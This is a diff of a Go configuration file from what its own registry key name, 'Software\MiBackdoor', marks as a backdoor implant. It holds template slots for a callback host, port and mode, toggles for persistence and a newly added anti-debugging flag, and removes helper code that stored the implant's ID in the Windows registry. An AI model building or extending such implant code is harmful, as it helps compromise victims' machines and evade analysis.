@@ -1,47 +1,17 @@
 package config
 
-import (
-    "golang.org/x/sys/windows/registry"
-)
 
 const (
     Host              = "{{HOST}}"
     Port              = "{{PORT}}"
     Mode              = "{{MODE}}"
     EnablePersistence = {{ENABLE_PERSISTENCE}}
+    AntiDebug         = {{ANTI_DEBUG}}
 
     // Clave y valor en el registro donde guardamos el UUID
-    regKeyPath = `Software\MiBackdoor`
-    regValue   = "UUID"
+    RegKeyPath = `Software\MiBackdoor`
+	RegValue   = "UUID"
 )
 
 // UUID se carga al arrancar (si ya había uno) o se actualiza con PersistUUID.
 var UUID string
-
-func init() {
-    // Intento leer el UUID existente desde HKCU\Software\MiBackdoor\UUID
-    if k, err := registry.OpenKey(registry.CURRENT_USER, regKeyPath, registry.READ); err == nil {
-        defer k.Close()
-        if u, _, err := k.GetStringValue(regValue); err == nil {
-            UUID = u
-        }
-    }
-}
-
-// PersistUUID guarda el UUID en el registro y actualiza la variable en memoria.
-func PersistUUID(id string) error {
-    // Crea (o abre) la clave con permiso de escritura
-    k, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.WRITE)
-    if err != nil {
-        return err
-    }
-    defer k.Close()
-
-    // Escribe el valor UUID
-    if err := k.SetStringValue(regValue, id); err != nil {
-        return err
-    }
-
-    UUID = id
-    return nil
-}
